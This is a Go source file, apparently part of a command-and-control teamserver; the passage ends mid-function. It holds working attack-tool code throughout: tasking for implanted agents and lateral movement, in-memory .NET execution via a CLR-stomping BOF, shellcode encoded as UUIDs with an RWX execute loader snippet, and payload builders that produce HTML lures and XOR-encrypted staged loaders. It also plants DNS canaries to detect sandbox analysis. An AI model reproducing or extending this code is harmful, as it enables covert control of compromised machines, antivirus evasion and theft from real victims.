package server

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
)

// securityHeaders wraps a handler and injects baseline HTTP security headers
// into every response. CSP is intentionally omitted — the GUI panel uses
// inline scripts and would break.
func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("X-Frame-Options", "DENY")
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Referrer-Policy", "no-referrer")
		next.ServeHTTP(w, r)
	})
}

// operatorMux builds the HTTP mux for the operator API.
// Only reachable via the mTLS operator port.
func (s *Server) operatorMux() *http.ServeMux {
	mux := http.NewServeMux()
	// viewer+ (read-only)
	mux.HandleFunc("/api/agents",    s.requireRole(RoleViewer, s.apiAgents))
	mux.HandleFunc("/api/agents/",   s.requireRole(RoleViewer, s.apiAgentDetail))
	mux.HandleFunc("/api/jobs",      s.requireRole(RoleViewer, s.apiJobs))
	mux.HandleFunc("/api/jobs/",     s.requireRole(RoleViewer, s.apiJobAction))
	mux.HandleFunc("/api/chat",      s.requireRole(RoleViewer, s.apiChat))
	mux.HandleFunc("/api/operators", s.requireRole(RoleViewer, s.apiOperators))
	mux.HandleFunc("/api/report",        s.requireRole(RoleViewer, s.apiReport))
	mux.HandleFunc("/api/attack-layer",  s.requireRole(RoleViewer, s.apiAttackLayer))
	mux.HandleFunc("/api/pubip",         s.requireRole(RoleViewer, s.apiPubIP))
	mux.HandleFunc("/api/creds",     s.requireRole(RoleViewer, s.apiCreds))
	mux.HandleFunc("/api/creds/",    s.requireRole(RoleViewer, s.apiCredAction))
	// operator+ (can task + build)
	mux.HandleFunc("/api/build",   s.requireRole(RoleOperator, s.apiBuild))
	mux.HandleFunc("/api/deliver", s.requireRole(RoleOperator, s.apiDeliver))
	mux.HandleFunc("/api/donut",   s.requireRole(RoleOperator, s.apiDonut))
	mux.HandleFunc("/api/srdi",    s.requireRole(RoleOperator, s.apiSRDI))
	mux.HandleFunc("/api/encode",  s.requireRole(RoleOperator, s.apiEncode))
	mux.HandleFunc("/api/gencert", s.requireRole(RoleOperator, s.apiGenCert))
	mux.HandleFunc("/api/rsocks",  s.requireRole(RoleOperator, s.apiRSocks))
	// SSE event stream + uploads
	mux.HandleFunc("/api/events",    s.requireRole(RoleViewer, s.apiSSE))
	mux.HandleFunc("/api/uploads",   s.requireRole(RoleViewer, s.apiUploads))
	mux.HandleFunc("/api/dl/",       s.requireRole(RoleViewer, s.apiDownload))
	mux.HandleFunc("/api/artifacts",  s.requireRole(RoleViewer, s.apiArtifactList))
	mux.HandleFunc("/api/artifacts/", s.requireRole(RoleOperator, s.apiArtifact))
	// Staging file server + tunnel management
	mux.HandleFunc("/api/stager",          s.requireRole(RoleOperator, s.apiStager))
	mux.HandleFunc("/api/stager/",         s.requireRole(RoleOperator, s.apiStager))
	mux.HandleFunc("/api/netinfo", s.requireRole(RoleViewer, s.apiNetInfo))
	// malleable profiles
	mux.HandleFunc("/api/profiles",  s.requireRole(RoleOperator, s.apiProfiles))
	mux.HandleFunc("/api/profiles/", s.requireRole(RoleOperator, s.apiProfiles))
	// reactions + webhooks + targets
	mux.HandleFunc("/api/reactions",  s.requireRole(RoleOperator, s.apiReactions))
	mux.HandleFunc("/api/reactions/", s.requireRole(RoleOperator, s.apiReactionAction))
	mux.HandleFunc("/api/webhooks",          s.requireRole(RoleOperator, s.apiWebhooks))
	mux.HandleFunc("/api/webhooks/test",     s.requireRole(RoleOperator, s.apiTestWebhook))
	mux.HandleFunc("/api/webhooks/",         s.requireRole(RoleOperator, s.apiWebhookAction))
	mux.HandleFunc("/api/telegram/updates",  s.requireRole(RoleOperator, s.apiTelegramUpdates))
	mux.HandleFunc("/api/targets",   s.requireRole(RoleViewer, s.apiTargets))
	mux.HandleFunc("/api/targets/",  s.requireRole(RoleOperator, s.apiTargetAction))
	// bloodhound
	mux.HandleFunc("/api/bloodhound",          s.requireRole(RoleOperator, s.apiBloodHound))
	mux.HandleFunc("/api/bloodhound/",         s.requireRole(RoleViewer,   s.apiBloodHound))
	mux.HandleFunc("/api/mesh",  s.requireRole(RoleViewer,   s.apiMesh))
	mux.HandleFunc("/api/mesh/", s.requireRole(RoleOperator, s.apiMesh))
	// admin only
	mux.HandleFunc("/api/roles",   s.requireRole(RoleAdmin, s.apiRoles))
	mux.HandleFunc("/api/canaries", s.requireRole(RoleViewer, s.apiCanaries))

	mux.HandleFunc("/api/ping", func(w http.ResponseWriter, r *http.Request) {
		operator := operatorFromCert(r)
		s.online.Heartbeat(operator)
		jsonOK(w, map[string]string{"status": "pong"})
	})
	return mux
}

// requireRole returns a handler that enforces a minimum role level.
func (s *Server) requireRole(minRole string, h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		op := operatorFromCert(r)
		role := s.db.GetOperatorRole(op)
		if !roleAllowed(role, minRole) {
			jsonErr(w, fmt.Sprintf("insufficient role: need %s, have %s", minRole, role), http.StatusForbidden)
			return
		}
		h(w, r)
	}
}

func roleAllowed(have, need string) bool {
	level := map[string]int{RoleViewer: 0, RoleOperator: 1, RoleAdmin: 2}
	return level[have] >= level[need]
}

// StartOperatorListener starts the mTLS teamserver API on operatorPort.
func (s *Server) StartOperatorListener(operatorPort int) error {
	serverCert, err := s.ca.SignServerCert(s.cfg.CertsDir, localIPs())
	if err != nil {
		return fmt.Errorf("operator cert: %w", err)
	}
	caPool := x509.NewCertPool()
	caPool.AppendCertsFromPEM(s.ca.CACertPEM)

	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{serverCert},
		ClientAuth:   tls.RequireAndVerifyClientCert,
		ClientCAs:    caPool,
		MinVersion:   tls.VersionTLS13,
	}

	// Solo loopback — los operadores acceden vía túnel SSH
	ln, err := tls.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", operatorPort), tlsCfg)
	if err != nil {
		return err
	}

	job := s.addJob("operator", operatorPort)
	srv := &http.Server{
		Handler:   securityHeaders(s.operatorMux()),
		TLSConfig: tlsCfg,
		ErrorLog:  log.New(io.Discard, "", 0), // silence noisy TLS rejection logs
	}
	s.mu.Lock()
	s.jobSrvs[job.ID] = srv
	s.mu.Unlock()

	go func() {
		s.printf("[*] Operator API on :%d  (job #%d, mTLS)\n", operatorPort, job.ID)
		if err := srv.Serve(ln); err != http.ErrServerClosed {
			s.stopJob(job.ID)
		}
	}()
	return nil
}

// ── agent endpoints ───────────────────────────────────────────────────────

func (s *Server) apiAgents(w http.ResponseWriter, r *http.Request) {
	agents, err := s.db.ListAgents()
	if err != nil {
		jsonErr(w, err.Error(), http.StatusInternalServerError)
		return
	}
	jsonOK(w, agents)
}

func (s *Server) apiAgentDetail(w http.ResponseWriter, r *http.Request) {
	// /api/agents/{id}
	// /api/agents/{id}/task    POST → queue task
	// /api/agents/{id}/results GET  → get results
	// /api/agents/{id}/kill    POST → kill agent
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/agents/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		jsonErr(w, "missing agent id", http.StatusBadRequest)
		return
	}
	agentID := parts[0]

	// Resolve partial ID
	agents, _ := s.db.ListAgents()
	for _, a := range agents {
		if strings.HasPrefix(a.ID, agentID) {
			agentID = a.ID
			break
		}
	}

	sub := ""
	if len(parts) >= 2 {
		sub = parts[1]
	}

	switch sub {
	case "":
		a, err := s.db.GetAgent(agentID)
		if err != nil {
			jsonErr(w, "agent not found", http.StatusNotFound)
			return
		}
		jsonOK(w, a)

	case "task":
		if r.Method != http.MethodPost {
			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Type    string `json:"type"`
			Args    string `json:"args"`
			Payload []byte `json:"payload,omitempty"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		operator := operatorFromCert(r)
		tid, err := s.db.QueueTask(agentID, req.Type, req.Args, req.Payload, operator)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		s.printf("[%s→%s] task #%d queued: %s %s\n", operator, agentID[:8], tid, req.Type, req.Args)
		// Track lateral movement so the spawned child agent can inherit ParentID
		if req.Type == "JUMP" || req.Type == "LATERAL" {
			var la struct {
				Host string `json:"host"`
			}
			if json.Unmarshal([]byte(req.Args), &la) == nil && la.Host != "" {
				s.registerPendingPivot(la.Host, agentID)
			}
		}
		// Update agent sleep in DB immediately so GUI reflects the new interval
		if req.Type == "SLEEP" {
			var sa struct {
				Sec    int `json:"sec"`
				Jitter int `json:"jitter"`
			}
			if json.Unmarshal([]byte(req.Args), &sa) == nil && sa.Sec > 0 {
				s.db.UpdateAgentSleep(agentID, sa.Sec, sa.Jitter)
			}
		}
		jsonOK(w, map[string]int64{"task_id": tid})

	case "results":
		// /api/agents/{id}/results/{taskID}  → single result (404 if not ready)
		if len(parts) >= 3 && parts[2] != "" {
			taskID, err := strconv.ParseInt(parts[2], 10, 64)
			if err != nil {
				jsonErr(w, "invalid task id", http.StatusBadRequest)
				return
			}
			result, err := s.db.GetResultByTaskID(taskID)
			if err != nil {
				jsonErr(w, "not ready", http.StatusNotFound)
				return
			}
			jsonOK(w, result)
			return
		}
		limit := 20
		if q := r.URL.Query().Get("limit"); q != "" {
			limit, _ = strconv.Atoi(q)
		}
		results, err := s.db.GetResults(agentID, limit)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, results)

	case "kill":
		if r.Method != http.MethodPost {
			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
			return
		}
		s.db.QueueTask(agentID, "KILL", "", nil, "")
		s.db.KillAgent(agentID)
		jsonOK(w, map[string]string{"status": "kill queued"})

	case "delete":
		if r.Method != http.MethodDelete {
			jsonErr(w, "DELETE required", http.StatusMethodNotAllowed)
			return
		}
		// If the agent was already killed (active=false), save its AES key so
		// any in-flight beacon still receives a KILL task rather than a 404
		// that would re-trigger registration. Agents deleted while still active
		// are intentionally allowed to re-register (operator chose not to kill).
		if ag, err := s.db.GetAgent(agentID); err == nil && !ag.Active {
			s.ghostAgent(agentID, ag.AESKey)
		}
		if err := s.db.DeleteAgent(agentID); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		operator := operatorFromCert(r)
		s.printf("[%s] deleted agent %s\n", operator, agentID[:8])
		jsonOK(w, map[string]string{"status": "deleted"})

	case "clrstomp":
		if r.Method != http.MethodPost {
			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Assembly string `json:"assembly"` // filename in uploads
			Args     string `json:"args"`     // args for .NET assembly Main()
			Victim   string `json:"victim"`   // victim GAC identity (empty = auto)
			Pipe     string `json:"pipe"`     // named pipe (empty = auto)
			Domain   string `json:"domain"`   // AppDomain name (empty = auto)
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if req.Assembly == "" {
			jsonErr(w, "assembly filename required", http.StatusBadRequest)
			return
		}
		uploadDir := filepath.Join(s.cfg.DataDir, "uploads")
		bofBytes, err := os.ReadFile(filepath.Join(uploadDir, "clr-stomp.x64.o"))
		if err != nil {
			jsonErr(w, "clr-stomp.x64.o not found in uploads — compile and upload it first", http.StatusInternalServerError)
			return
		}
		asmResolved := filepath.Join(uploadDir, filepath.Clean(req.Assembly))
		if !strings.HasPrefix(asmResolved, uploadDir+string(os.PathSeparator)) {
			jsonErr(w, "invalid assembly path", http.StatusBadRequest)
			return
		}
		asmBytes, err := os.ReadFile(asmResolved)
		if err != nil {
			jsonErr(w, "assembly not found in uploads: "+err.Error(), http.StatusNotFound)
			return
		}
		pipe := req.Pipe
		if pipe == "" {
			pipe = fmt.Sprintf("clrstomp_%d", time.Now().UnixNano()%100000)
		}
		domain := req.Domain
		if domain == "" {
			domain = "StompDomain"
		}
		packed := clrstompPack(req.Victim, req.Args, pipe, domain, asmBytes)
		operator := operatorFromCert(r)
		tid, err := s.db.QueueTask(agentID, "CLR_STOMP",
			base64.StdEncoding.EncodeToString(packed), bofBytes, operator)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		s.printf("[%s→%s] task #%d queued: CLR_STOMP assembly=%s\n",
			operator, agentID[:8], tid, req.Assembly)
		jsonOK(w, map[string]int64{"task_id": tid})

	case "dotnet_exec":
		// POST /api/agents/{id}/dotnet_exec
		// Body: {"assembly":"<base64_bytes>","args":"arg1 arg2","type":"<opt>","method":"<opt>"}
		if r.Method != http.MethodPost {
			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Assembly string `json:"assembly"` // base64-encoded .NET PE bytes
			Args     string `json:"args"`     // argument string for entry method
			Type     string `json:"type"`     // optional: entry type name
			Method   string `json:"method"`   // optional: entry method name
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if req.Assembly == "" {
			jsonErr(w, "assembly (base64) required", http.StatusBadRequest)
			return
		}
		// Validate the base64 is decodable
		asmBytes, err := base64.StdEncoding.DecodeString(req.Assembly)
		if err != nil {
			jsonErr(w, "assembly: invalid base64: "+err.Error(), http.StatusBadRequest)
			return
		}
		// Re-encode to canonical base64 for the task args JSON
		asmB64 := base64.StdEncoding.EncodeToString(asmBytes)
		taskArgsJSON, _ := json.Marshal(map[string]string{
			"asm":    asmB64,
			"args":   req.Args,
			"type":   req.Type,
			"method": req.Method,
		})
		operator := operatorFromCert(r)
		tid, err := s.db.QueueTask(agentID, "DOTNET_EXEC", string(taskArgsJSON), nil, operator)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		s.printf("[%s→%s] task #%d queued: DOTNET_EXEC (%d bytes)\n",
			operator, agentID[:8], tid, len(asmBytes))
		jsonOK(w, map[string]int64{"task_id": tid})

	case "note":
		if r.Method != http.MethodPost {
			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			Notes string `json:"notes"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if err := s.db.UpdateAgentNotes(agentID, req.Notes); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, map[string]string{"status": "ok"})

	case "parent":
		// POST /api/agents/{id}/parent  {"parent_id":"<uuid or empty to clear>"}
		if r.Method != http.MethodPost {
			jsonErr(w, "POST required", http.StatusMethodNotAllowed)
			return
		}
		var req struct {
			ParentID string `json:"parent_id"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if err := s.db.UpdateAgentParent(agentID, req.ParentID); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, map[string]string{"status": "ok"})

	default:
		jsonErr(w, "unknown action: "+sub, http.StatusNotFound)
	}
}

// apiEncode provides shellcode encoding utilities.
// POST /api/encode?type=uuid&file=<filename>
//   Returns UuidFromStringA-compatible C code and a UUID list for the shellcode.
func (s *Server) apiEncode(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
		return
	}
	encType := r.URL.Query().Get("type")
	filename := r.URL.Query().Get("file")
	if encType == "" {
		encType = "uuid"
	}
	if filename == "" {
		jsonErr(w, "file query param required", http.StatusBadRequest)
		return
	}
	uploadDir := filepath.Join(s.cfg.DataDir, "uploads")
	encResolved := filepath.Join(uploadDir, filepath.Clean(filename))
	if !strings.HasPrefix(encResolved, uploadDir+string(os.PathSeparator)) {
		jsonErr(w, "invalid file path", http.StatusBadRequest)
		return
	}
	data, err := os.ReadFile(encResolved)
	if err != nil {
		jsonErr(w, "file not found: "+err.Error(), http.StatusNotFound)
		return
	}

	switch encType {
	case "uuid":
		code, uuids := encodeUUIDs(data)
		jsonOK(w, map[string]any{
			"encoding": "uuid",
			"filename": filename,
			"bytes":    len(data),
			"uuids":    len(uuids),
			"code":     code,
		})
	default:
		jsonErr(w, "unknown encoding type (supported: uuid)", http.StatusBadRequest)
	}
}

// encodeUUIDs encodes raw bytes as a list of UUID strings decodable via
// UuidFromStringA() (Rpcrt4.dll).  Returns a C code snippet + raw UUID list.
//
// Encoding layout (matches UuidFromStringA byte order):
//   UUID = {d1(4 LE), d2(2 LE), d3(2 LE), d4[0], d4[1], d4[2..7]}
// So sc[0..3] → d1 (printed big-endian), sc[4..5] → d2, sc[6..7] → d3,
// sc[8..9] → d4[0..1], sc[10..15] → d4[2..7].
func encodeUUIDs(sc []byte) (code string, uuids []string) {
	// Pad to multiple of 16
	if rem := len(sc) % 16; rem != 0 {
		sc = append(sc, make([]byte, 16-rem)...)
	}

	for i := 0; i < len(sc); i += 16 {
		chunk := sc[i : i+16]
		// d1 is 4 bytes little-endian in memory but printed big-endian in UUID string
		d1 := fmt.Sprintf("%02x%02x%02x%02x",
			chunk[3], chunk[2], chunk[1], chunk[0])
		d2 := fmt.Sprintf("%02x%02x", chunk[5], chunk[4])
		d3 := fmt.Sprintf("%02x%02x", chunk[7], chunk[6])
		d4a := fmt.Sprintf("%02x%02x", chunk[8], chunk[9])
		d4b := fmt.Sprintf("%02x%02x%02x%02x%02x%02x",
			chunk[10], chunk[11], chunk[12], chunk[13], chunk[14], chunk[15])
		uuid := fmt.Sprintf("%s-%s-%s-%s-%s", d1, d2, d3, d4a, d4b)
		uuids = append(uuids, uuid)
	}

	var sb strings.Builder
	sb.WriteString("// UUID-encoded shellcode — decode with UuidFromStringA (Rpcrt4.dll)\n")
	sb.WriteString("// Usage: UuidFromStringA(uuids[i], (UUID*)((BYTE*)mem + i*16))\n\n")
	sb.WriteString("#include <rpc.h>\n")
	sb.WriteString("#pragma comment(lib, \"Rpcrt4.lib\")\n\n")
	sb.WriteString(fmt.Sprintf("const char* uuids[] = {\n"))
	for i, u := range uuids {
		if i < len(uuids)-1 {
			fmt.Fprintf(&sb, "    \"%s\",\n", u)
		} else {
			fmt.Fprintf(&sb, "    \"%s\"\n", u)
		}
	}
	sb.WriteString("};\n")
	fmt.Fprintf(&sb, "const int uuid_count = %d; // %d bytes\n", len(uuids), len(sc))
	sb.WriteString(`
// Loader snippet:
// LPVOID mem = VirtualAlloc(NULL, uuid_count * 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
// for (int i = 0; i < uuid_count; i++)
//     UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)((BYTE*)mem + i * 16));
// ((void(*)())mem)();
`)
	return sb.String(), uuids
}

// clrstompPack serialises the five BOF arguments that go.c's go() function
// reads via BeaconDataExtract in this exact order:
//
//  1. Z  victimFullIdentityW  UTF-16LE null-terminated (empty → BOF uses default GAC assembly)
//  2. z  assemblyArgsA        C-string null-terminated
//  3. z  pipeNameA            C-string null-terminated
//  4. z  appDomainNameA       C-string null-terminated
//  5. b  payloadBytes         raw .NET assembly
//
// Each field is prefixed by a big-endian uint32 length (the beacon wire format).
func clrstompPack(victim, asmArgs, pipe, domain string, asmBytes []byte) []byte {
	var buf bytes.Buffer

	writeWStr := func(s string) {
		wc := utf16.Encode([]rune(s))
		wc = append(wc, 0)
		b := make([]byte, len(wc)*2)
		for i, v := range wc {
			binary.LittleEndian.PutUint16(b[i*2:], v)
		}
		_ = binary.Write(&buf, binary.BigEndian, uint32(len(b)))
		buf.Write(b)
	}
	writeCStr := func(s string) {
		b := append([]byte(s), 0)
		_ = binary.Write(&buf, binary.BigEndian, uint32(len(b)))
		buf.Write(b)
	}
	writeBin := func(b []byte) {
		_ = binary.Write(&buf, binary.BigEndian, uint32(len(b)))
		buf.Write(b)
	}

	writeWStr(victim)
	writeCStr(asmArgs)
	writeCStr(pipe)
	writeCStr(domain)
	writeBin(asmBytes)

	return buf.Bytes()
}

// ── job/listener endpoints ────────────────────────────────────────────────

func (s *Server) apiJobs(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		jsonOK(w, s.GetJobs())

	case http.MethodPost:
		var req struct {
			Proto  string `json:"proto"` // "http" | "https" | "mtls" | "dns" | "extc2"
			Port   int    `json:"port"`
			Domain string `json:"domain,omitempty"` // required for DNS
			Secret string `json:"secret,omitempty"` // required for extc2
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		if s.mux == nil {
			jsonErr(w, "server not fully started", http.StatusServiceUnavailable)
			return
		}
		switch strings.ToLower(req.Proto) {
		case "http":
			id := s.StartHTTP(s.mux, req.Port)
			jsonOK(w, map[string]int{"job_id": id})
		case "mtls":
			id, err := s.StartMTLS(s.mux, req.Port)
			if err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			jsonOK(w, map[string]int{"job_id": id})
		case "tcp":
			id, err := s.StartTCP(req.Port)
			if err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			jsonOK(w, map[string]int{"job_id": id})
		case "wstunnel":
			id := s.StartWSTunnel(req.Port)
			jsonOK(w, map[string]int{"job_id": id})
		case "https":
			id, err := s.StartHTTPS(s.mux, req.Port)
			if err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			jsonOK(w, map[string]int{"job_id": id})
		case "extc2":
			secret := req.Secret
			if secret == "" {
				jsonErr(w, "secret required for External C2 listener", http.StatusBadRequest)
				return
			}
			id, err := s.StartExtC2(req.Port, secret)
			if err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			jsonOK(w, map[string]int{"job_id": id})
		case "dns":
			domain := req.Domain
			if domain == "" {
				jsonErr(w, "domain required for DNS listener", http.StatusBadRequest)
				return
			}
			id, err := s.StartDNS(domain, req.Port)
			if err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			jsonOK(w, map[string]int{"job_id": id})
		default:
			jsonErr(w, "proto must be http, https, mtls, wstunnel, dns or extc2", http.StatusBadRequest)
		}

	default:
		jsonErr(w, "GET or POST required", http.StatusMethodNotAllowed)
	}
}

func (s *Server) apiJobAction(w http.ResponseWriter, r *http.Request) {
	// DELETE /api/jobs/{id}
	idStr := strings.TrimPrefix(r.URL.Path, "/api/jobs/")
	id, err := strconv.Atoi(idStr)
	if err != nil {
		jsonErr(w, "invalid job id", http.StatusBadRequest)
		return
	}
	if r.Method != http.MethodDelete {
		jsonErr(w, "DELETE required", http.StatusMethodNotAllowed)
		return
	}
	if err := s.StopJob(id); err != nil {
		jsonErr(w, err.Error(), http.StatusNotFound)
		return
	}
	s.removeJob(id)
	jsonOK(w, map[string]string{"status": "stopped"})
}

// ── chat endpoint ─────────────────────────────────────────────────────────

func (s *Server) apiChat(w http.ResponseWriter, r *http.Request) {
	operator := operatorFromCert(r)
	s.online.Heartbeat(operator) // cada poll de chat cuenta como heartbeat

	switch r.Method {
	case http.MethodGet:
		sinceID := int64(0)
		if v := r.URL.Query().Get("since"); v != "" {
			fmt.Sscanf(v, "%d", &sinceID)
		}
		jsonOK(w, s.chat.Since(sinceID))

	case http.MethodPost:
		var req struct {
			Text string `json:"text"`
		}
		if err := jsonBody(r, &req); err != nil || req.Text == "" {
			jsonErr(w, "missing text", http.StatusBadRequest)
			return
		}
		msg := s.chat.Post(operator, req.Text)
		s.printf("[chat] %s: %s\n", operator, req.Text)
		jsonOK(w, msg)

	default:
		jsonErr(w, "GET or POST required", http.StatusMethodNotAllowed)
	}
}

func (s *Server) apiOperators(w http.ResponseWriter, r *http.Request) {
	jsonOK(w, s.online.Online())
}

// ── build + cert endpoints ────────────────────────────────────────────────

func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
		return
	}
	var cfg BuildConfig
	if err := jsonBody(r, &cfg); err != nil {
		jsonErr(w, err.Error(), http.StatusBadRequest)
		return
	}
	if cfg.Transport == "mtls" && cfg.AgentCertPEM == "" {
		certPEM, keyPEM, err := s.ca.SignAgentCert("agent-remote")
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		cfg.AgentCertPEM = string(certPEM)
		cfg.AgentKeyPEM = string(keyPEM)
		cfg.CACertPEM = string(s.ca.CACertPEM)
	}

	// Generate DNS canary token for burn detection in sandboxes.
	// If a DNS C2 listener is active, embed a unique token so that sandbox
	// analysis resolves "canary.<token>.<c2dns_domain>" and triggers a burn alert.
	if cfg.CanaryDomain == "" {
		if dnsDomain := s.activeDNSDomain(); dnsDomain != "" {
			tokenBytes := make([]byte, 8)
			rand.Read(tokenBytes) //nolint:errcheck
			token := hex.EncodeToString(tokenBytes)
			cfg.CanaryDomain = token + "." + dnsDomain
			label := fmt.Sprintf("lang=%s transport=%s url=%s", cfg.Lang, cfg.Transport, cfg.ServerURL)
			s.db.RegisterCanary(token, label) //nolint:errcheck
		}
	}

	// stream=1 → SSE streaming build output (used by GUI for garble builds)
	if r.URL.Query().Get("stream") == "1" {
		s.apiBuildStream(w, r, cfg)
		return
	}

	result := map[string]string{}

	root := projectRoot()
	payloadsDir := filepath.Join(root, "bin", "payloads")
	deliveryDir := filepath.Join(root, "bin", "delivery")
	os.MkdirAll(payloadsDir, 0755)
	os.MkdirAll(deliveryDir, 0755)

	// Nim agent — Windows EXE/DLL, ~560KB, no Go runtime signature
	if cfg.Lang == "nim" {
		nimPath, err := BuildNimEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "nim build: "+err.Error(), http.StatusInternalServerError)
			return
		}
		if cfg.Format == "dll" {
			result["dll"] = nimPath
			// Convert Nim DLL to shellcode with donut (same pipeline as Go DLL)
			if rawPath, err := BuildRAW(nimPath, payloadsDir); err == nil {
				result["bin"] = rawPath
				if cfg.Encrypt != "" {
					if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
						result["enc"] = encPath
						result["stub"] = stubPath
					}
				}
			}
		} else {
			result["exe"] = nimPath
		}
		jsonOK(w, result)
		return
	}

	if cfg.Lang == "rust" {
		rustPath, err := BuildRustEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "rust build: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["exe"] = rustPath
		jsonOK(w, result)
		return
	}

	if cfg.Lang == "c" {
		cPath, err := BuildCAgentEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "c build: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["exe"] = cPath
		jsonOK(w, result)
		return
	}

	switch {
	case cfg.GOOS == "linux":
		elfPath, err := BuildLinux(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build linux: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["elf"] = elfPath

	case cfg.GOOS == "darwin":
		macPath, err := BuildDarwin(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build darwin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["macho"] = macPath

	case cfg.Format == "dll":
		dllPath, err := BuildDLL(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build dll: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["dll"] = dllPath
		// Convert DLL to shellcode with donut
		if rawPath, err := BuildRAW(dllPath, payloadsDir); err == nil {
			result["bin"] = rawPath
			if cfg.Encrypt != "" {
				if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
					result["enc"] = encPath
					result["stub"] = stubPath
				}
			}
		}

	case cfg.Format == "html":
		exePath, err := BuildEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		htmlLure := cfg.LureName
		if htmlLure == "" {
			htmlLure = cfg.OutputName
		}
		htmlPath, err := BuildHTML(exePath, deliveryDir, htmlLure)
		if err != nil {
			jsonErr(w, "build html: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["html"] = htmlPath

	case cfg.Format == "loader":
		if cfg.StageURL == "" {
			jsonErr(w, "stage-url required for format=loader", http.StatusBadRequest)
			return
		}
		exePath, err := BuildEXE(cfg, payloadsDir)
		if err != nil {
			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binPath, err := BuildRAW(exePath, payloadsDir)
		if err != nil {
			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
			return
		}
		rawBin, err := os.ReadFile(binPath)
		if err != nil {
			jsonErr(w, "read .bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		// zlib compress before XOR → reduces staged payload ~4x
		compressed, err := CompressPayload(rawBin)
		if err != nil {
			jsonErr(w, "compress: "+err.Error(), http.StatusInternalServerError)
			return
		}
		key, _ := xorKey()
		encBin := xorBytes(compressed, key)
		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
		if encErr != nil {
			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		if _, encErr = encFile.Write(encBin); encErr != nil {
			encFile.Close()
			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
			return
		}
		encFile.Close()
		encBinPath := encFile.Name()
		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
		if err != nil {
			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
			return
		}
		binURL := cfg.StageURL + "/stage/" + binToken
		SetStageURL(binToken, binURL)
